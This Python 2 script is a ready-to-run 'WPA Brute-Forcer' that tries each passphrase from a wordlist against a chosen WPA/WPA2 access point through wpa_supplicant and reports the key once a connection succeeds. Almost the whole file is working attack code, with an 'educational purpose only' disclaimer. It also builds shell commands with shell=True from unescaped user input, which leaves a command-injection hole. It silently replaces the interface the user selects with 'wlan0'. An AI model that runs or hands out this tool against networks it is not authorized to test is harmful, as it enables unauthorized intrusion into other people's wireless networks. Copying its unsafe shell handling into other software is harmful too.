#! /usr/bin/python
#
# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
#
# This is a new revision where instead of using network manager, i use WPA_Supplicant to do the job.
# Written By SYChua, syworks@gmail.com
#
#

appver="1.0, r3"
apptitle="WPA Brute-Forcer"
appcreated="23 Dec 2013"
appupdated="26 Dec 2013"
appnote="Written By SYChua, " + appcreated + ", Updated " + appupdated

class fcolor:
	BOLD='\033[1m'
	Black='\033[0;30m'
	Red='\033[0;31m'
	Green='\033[0;32m'
	Yellow='\033[0;33m'
	Blue='\033[0;34m'
	Pink='\033[0;35m'
	Cyan='\033[0;36m'
	White='\033[0;37m'
	BBlack='\033[1;30m'
	BRed='\033[1;31m'
	BBlue='\033[1;34m'
	BYellow='\033[1;33m'
	BGreen='\033[1;32m'
	BPink='\033[1;35m'
	BCyan='\033[1;36m'
	BWhite='\033[1;37m'
	UBlack='\033[4;30m'
	URed='\033[4;31m'
	UGreen='\033[4;32m'
	UYellow='\033[4;33m'
	UBlue='\033[4;34m'
	UPink='\033[4;35m'
	UCyan='\033[4;36m'
	UWhite='\033[4;37m'
	BUBlack=BOLD + '\033[4;30m'
	BURed=BOLD + '\033[4;31m'
	BUGreen=BOLD + '\033[4;32m'
	BUYellow=BOLD + '\033[4;33m'
	BUBlue=BOLD + '\033[4;34m'
	BUPink=BOLD + '\033[4;35m'
	BUCyan=BOLD + '\033[4;36m'
	BUWhite=BOLD + '\033[4;37m'
	Gray='\033[1;90m'
	IRed='\033[1;91m'
	IGreen='\033[1;92m'
	IYellow='\033[1;93m'
	IBlue='\033[1;94m'
	IPink='\033[1;95m'
	ICyan='\033[1;96m'
	IWhite='\033[1;97m'
	CReset='\033[0m'
	CDebug='\033[0;90m'
	CDebugB='\033[1;90m'
	allfinal=''

import requests
import sys,os
import subprocess
import curses
import termios
import tty
import time
import signal
import select 
import datetime
import os.path
import binascii, re
import commands
import array
import struct
from subprocess import call
from subprocess import Popen, PIPE
import threading

TWidth=103
ScriptName=sys.argv[0]



def read_a_key():
    stdinFileDesc = sys.stdin.fileno()
    oldStdinTtyAttr = termios.tcgetattr(stdinFileDesc)
    try:
        tty.setraw(stdinFileDesc)
        sys.stdin.read(1)
    finally:
        termios.tcsetattr(stdinFileDesc, termios.TCSADRAIN, oldStdinTtyAttr)

def printd(ptext):
	if DebugMode=="1":
		print fcolor.CDebugB  + "[DBG]  " + fcolor.CDebug + ptext  + fcolor.CReset
	if DebugMode=="2":
		print fcolor.CDebugB + "[DBG]  " + fcolor.CDebug + ptext + fcolor.CReset
		print fcolor.CReset + fcolor.White + "       [Break - Press Any Key To Continue]" + fcolor.CReset
		read_a_key()


def printc(ptype, ptext,ptext2):
	printd("PType - " + str(ptype) + "\n       " + "PText = " + str(ptext) + "\n       " + "PText2 = " + str(ptext2))
	bcolor=fcolor.BGreen
	if ptype=="i":
		pcolor=fcolor.BBlue
		tcolor=fcolor.BWhite
	if ptype=="H":
		pcolor=fcolor.BBlue
		tcolor=fcolor.BWhite
		hcolor=fcolor.BUBlue
	if ptype=="!":
		pcolor=fcolor.BRed
		tcolor=fcolor.BYellow
	if ptype=="!!":
		ptype="!"
		pcolor=fcolor.BRed
		tcolor=fcolor.BRed
	if ptype=="." or ptype=="-":
		pcolor=fcolor.BGreen
		tcolor=fcolor.Green
	if ptype=="..":
		ptype="."
		pcolor=fcolor.BGreen
		tcolor=fcolor.BGreen
	if ptype==">" or ptype=="+":
		pcolor=fcolor.BCyan
		tcolor=fcolor.BCyan
	if ptype==" ":
		pcolor=fcolor.BYellow
		tcolor=fcolor.Green
	if ptype=="  ":
		pcolor=fcolor.BYellow
		tcolor=fcolor.BGreen
	if ptype=="?":
		pcolor=fcolor.BYellow
		tcolor=fcolor.BGreen
	if ptype=="x":
		pcolor=fcolor.BRed
		tcolor=fcolor.BBlue
	if ptype=="@" or ptype=="@^":
		pcolor=fcolor.BRed
		tcolor=fcolor.White
	bcolor=pcolor
	if ptext!="":
		tscolor=fcolor.Blue
		ts = time.time()
		DateTimeStamp=datetime.datetime.fromtimestamp(ts).strftime('%d/%m/%Y %H:%M:%S')
		TimeStamp=datetime.datetime.fromtimestamp(ts).strftime('%H:%M:%S')
		DateStamp=datetime.datetime.fromtimestamp(ts).strftime('%d/%m/%Y')
		ptext=ptext.replace("%dt -",tscolor + DateTimeStamp + " -" + tcolor)
		ptext=ptext.replace("%dt",tscolor + DateTimeStamp + tcolor)
		ptext=ptext.replace("%t -",tscolor + TimeStamp + " -" + tcolor)
		ptext=ptext.replace("%t",tscolor + TimeStamp + tcolor)
		ptext=ptext.replace("%d -",tscolor + DateStamp + " -" + tcolor)
		ptext=ptext.replace("%d",tscolor + DateStamp + tcolor)
	if ptype=="x":
		if ptext=="":
			ptext="Press Any Key To Continue..."
		c1=bcolor + "[" + pcolor + ptype + bcolor + "]  " + tcolor + ptext
		print c1,
		sys.stdout.flush()
		read_a_key()
		print ""
		return
	if ptype=="H":
		c1=bcolor + "[" + pcolor + "i" + bcolor + "]  " + hcolor + ptext + fcolor.CReset 
		print c1
		return
	if ptype=="@" or ptype=="@^":
		if ptext2=="":
			ptext2=5
		t=int(ptext2)
		while t!=0:
			s=bcolor + "[" + pcolor + str(t) + bcolor + "]  " + tcolor + ptext + "\r"
			s=s.replace("%s",pcolor+str(ptext2)+tcolor)
			sl=len(s)
			print s,
			sys.stdout.flush()
			time.sleep(1)
			s=""
			ssaa="\r"
			print "" + s.ljust(sl+2) + ssaa,
			sys.stdout.flush()
			if ptype=="@^":
				t=t-1
        			while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
            				line = sys.stdin.readline()
            				if line:
						print bcolor + "[" + fcolor.BRed + "!" + bcolor + "]  " + fcolor.Red + "Interupted by User.." + fcolor.Green
						return
			
			else:
			    t=t-1			
		c1=bcolor + "[" + pcolor + "-" + bcolor + "]  " + tcolor + ptext + "\r"
		c1=c1.replace("%s",pcolor+str(ptext2)+tcolor)
		print c1,
		sys.stdout.flush()
 		print ""
		return
	if ptype=="?":
		if ptext2!="":
			usr_resp=raw_input(bcolor + "[" + pcolor + ptype + bcolor + "]  " + tcolor + ptext + " ( " + pcolor + ptext2 + tcolor + " ) : " + fcolor.BWhite)
			return usr_resp;
		else:
			usr_resp=raw_input(bcolor + "[" + pcolor + ptype + bcolor + "]  " + tcolor + ptext + " : " + fcolor.BWhite)
			return usr_resp;
	if ptype==" " or ptype=="  ":
		print bcolor + "     " + tcolor + ptext + ptext2
	else:
		print bcolor + "[" + pcolor + ptype + bcolor + "]  " + tcolor + ptext + ptext2



def DrawLine(LineChr,LineColor,LineCount):
	printd(fcolor.CDebugB + "DrawLine Function\n" + fcolor.CDebug + "       LineChr - " + str(LineChr) + "\n       " + "LineColor = " + str(LineColor) + "\n       " + "LineCount = " + str(LineCount))
	if LineColor=="":
		LineColor=fcolor.BBlue
	if LineChr=="":
		LineChr="-"
	if LineCount=="":
		curses.setupterm()
		TWidth=curses.tigetnum('cols')
		TWidth=TWidth-1
	else:
		TWidth=LineCount
	print LineColor + LineChr * TWidth

def DisplayAppDetail():
	print fcolor.BBlue + apptitle + ", Version " + appver
	print fcolor.Green + appnote
	print ""
	print fcolor.White + "Note : This application allow user to crack WPA/WPA2 access point without having any client connected to it."
	print fcolor.White + "       Application will attempt to use the list of words provided to bruteforce the WPA/WPA2 access point."
	print fcolor.White + "       Cracking is slow, but this is the proof of concept that we do not need a client to be connected to an access point in order to crack WPA."
	print ""
	print fcolor.BRed + "[!]  Legal Disclaimer : " + fcolor.Red + "This script is written for educational purpose only"
	print fcolor.Red + "     Usage of this application for attacking targets without prior mutual consent is illegal"
	print fcolor.Red + "     It is the end user's responsibility to obey all applicable local, state and federal laws."
	print fcolor.Red + "     Author assume no liability and are not responsible for any misuse or damage caused by this program."
	print ""
	DrawLine("-",fcolor.Gray,"")
	print ""

def GetSSID():
	ESSID=printc ("?", "Enter the SSID","")
	if ESSID=="":
		Result=GetSSID()
		return Result;
	ESSID=ESSID.rstrip();
	ESSID=ESSID.lstrip();
	printc ("i", "SSID ==> " + fcolor.BRed + ESSID,"")
	print ""
	return ESSID;

def GetDictLocation():
	DefaultDict="/usr/share/john/password.lst"
	DictLocation=printc("?","Dictionary location :",DefaultDict)
	if DictLocation=="":
		printc ("i", "Dictionary Location ==> " + fcolor.BRed + DefaultDict,"")
		DictLocation=DefaultDict
		print ""
	else:
		printc ("i", "Dictionary Location ==> " + fcolor.BRed + DictLocation,"")
		print ""
	FE=os.path.isfile(DictLocation)
	if FE!=True:
		ErrText="Dictionary location : " + fcolor.BYellow + str(DictLocation) + fcolor.BRed + " does not exist !"
		printc ("!!",str(ErrText),"")
		print ""
		GetDictLocation()
	return DictLocation;

def GetTimeOut():
	DefaultTimeOut=20
	ConnTimeOut=printc("?","Connection Time Out :",str(DefaultTimeOut))
	if ConnTimeOut=="":
	     ConnTimeOut=DefaultTimeOut
	try:
	     float(ConnTimeOut)
	except ValueError:
	     printc ("!", "Please enter a numberic value !","")
	     GetTimeOut()
	     return;
	printc ("i", "Connection Timeout ==> " + fcolor.BRed + str(ConnTimeOut),"")
	print ""
	return ConnTimeOut;


def DisplayInterface():
	ps=subprocess.Popen("ifconfig -a | grep 'HWaddr'", shell=True, stdout=subprocess.PIPE)
	result="\t" + ps.stdout.read()
	result=result.replace("HWaddr","\tMAC : ")
	result=result.replace("\n","\n\t")
	IFaceList=result
	print fcolor.CReset + fcolor.Gray + result
	return IFaceList;



def GetInterface():
	printc ("i","List of Interfaces","")
	IFaceList=DisplayInterface()
	IFACE=printc("?","Enter the interface to use","")
	if IFACE=="":
		Result=GetInterface()
		return Result;		 
	else:
		if IFACE not in IFaceList:
			ErrText="Interface " + fcolor.BYellow + str(IFACE) + fcolor.BRed + " not found !"
			printc ("!!",str(ErrText),"")
			print ""
			GetInterface()
			return
		printc ("i", "Interface ==> " + fcolor.BRed + IFACE,"")
		print ""
		return IFACE;


class Command(object):
    def __init__(self, cmd):
        self.cmd = cmd
        self.process = None

    def run(self, timeout):
        def target():
	    printd ("Thread started")
            self.process = subprocess.Popen(self.cmd, shell=True)
            self.process.communicate()
	    printd ("Thread Finish")

        thread = threading.Thread(target=target)
        thread.start()

        thread.join(timeout)
        if thread.is_alive():
	    printd ("Terminating process..")
            self.process.terminate()
            thread.join()
	    printd ("Process Terminated")



def BeginCrack(IFACE,ESSID,DictLocation,ConnTimeOut):
	resultfile="wpa.log"
	printc ("H","Setting","")
	printc (" ",fcolor.BWhite + "Interface\t: " + fcolor.BRed + str(IFACE) + fcolor.CReset,"")
	printc (" ",fcolor.BWhite + "SSID\t: " + fcolor.BRed + str(ESSID) + fcolor.CReset,"")
	printc (" ",fcolor.BWhite + "Dict\t: " + fcolor.BRed + str(DictLocation) + fcolor.CReset,"")
	printc (" ",fcolor.BWhite + "Timeout\t: " + fcolor.BRed + str(ConnTimeOut) + fcolor.CReset,"")
	print ""
	printc ("x","Press any key to start attacking..","")
	printd ("Deleting Result File [ " + resultfile + " ]")
	ps=subprocess.Popen("rm " + resultfile + " > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
	ps=subprocess.Popen("/etc/init.d/network-manager > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	

	SEEKED_SSID=ESSID
	array=[]
	with open(DictLocation,"r") as f:
		for line in f:
		    line=line.replace("\n","")
		    sl=len(line)
		    if sl>=8 and sl<=63:
			SEEKED_PASSPHRASE=line
			cstatus=fcolor.BGreen + "[.]  Trying out " + fcolor.BWhite + str(SEEKED_PASSPHRASE) + fcolor.BGreen + " .... " +  ""
			print cstatus,
			sys.stdout.flush()
			ps=subprocess.Popen("wpa_passphrase " + str(ESSID) + " '" + SEEKED_PASSPHRASE + "' > wpa_supplicant.conf", shell=True, stdout=subprocess.PIPE)	
			ps=subprocess.Popen("wpa_passphrase " + str(ESSID) + " '" + SEEKED_PASSPHRASE + "'", shell=True, stdout=subprocess.PIPE)
			result=ps.stdout.read()
			if DebugMode=="1":
				print ""
			printd (result)
	

			mcmd="wpa_supplicant -Dwext -i" + str(IFACE) + " -c wpa_supplicant.conf -f " + resultfile + " > /dev/null 2>&1"
			printd (mcmd)
			ps=subprocess.Popen("killall wpa_supplicant > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
			command = Command(mcmd)
			ConnTimeOut=float(ConnTimeOut)
			command.run(timeout=ConnTimeOut)
			FoundKey=""
			allline=""
			with open(resultfile,"r") as res:
				for line in res:
					allline=allline + line
					if " 4-Way Handshake failed - pre-shared key may be incorrect" in line:
						FoundKey="0"
					if "CTRL-EVENT-CONNECTED" in line:
						FoundKey="1"
			printd ("" + allline)
			if FoundKey=="1":
				print fcolor.BGreen + "Successful..." + fcolor.CReset + fcolor.White
				printc ("i",fcolor.BRed + "WPA Passphase Found !!","")
				printc (" ",fcolor.BWhite + "ESSID\t[ " + fcolor.BRed + ESSID + fcolor.BWhite + " ]","")		
				printc (" ",fcolor.BWhite + "Passphase\t[ " + fcolor.BRed + str(SEEKED_PASSPHRASE) + fcolor.BWhite + " ]","")
				return
			if FoundKey=="0":
				print fcolor.BRed + "Wrong Key !!" + fcolor.CReset + fcolor.White
			if FoundKey=="":
				print fcolor.BRed + "Connection Error !!" + fcolor.CReset + fcolor.White
			printd ("")
			
			printd ("Deleting Result File [ " + resultfile + " ]")
			ps=subprocess.Popen("rm " + resultfile + " > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)
			ps=subprocess.Popen("ifdown " + str(IFACE) + " --force" , shell=True, stdout=subprocess.PIPE)												

	


	

DebugMode="0"
os.system('clear')
cmdline=len(sys.argv)
DisplayAppDetail()
IFaceList=""
WPAS="/sbin/wpa_supplicant"
try:
	FE=os.path.isfile(WPAS)
	if FE==True:
		IFACE=GetInterface()
		IFACE="wlan0"
		ESSID=GetSSID()
		DictLocation=GetDictLocation()
		ConnTimeOut=GetTimeOut()	
	 	print ""
		Result=BeginCrack(IFACE,ESSID,DictLocation,ConnTimeOut)
		exit(0)
	else:
		printc ("!!","WPA Supplicant must be installed inorder to use WPA Brute-Forcer !","")
		exit (0)



except (KeyboardInterrupt, SystemExit):
    printd("KeyboardInterrupt - " + str(KeyboardInterrupt) + "\n        SystemExit - " + str(SystemExit))
    print fcolor.BRed + "\n[!]  Session exited !!\n"
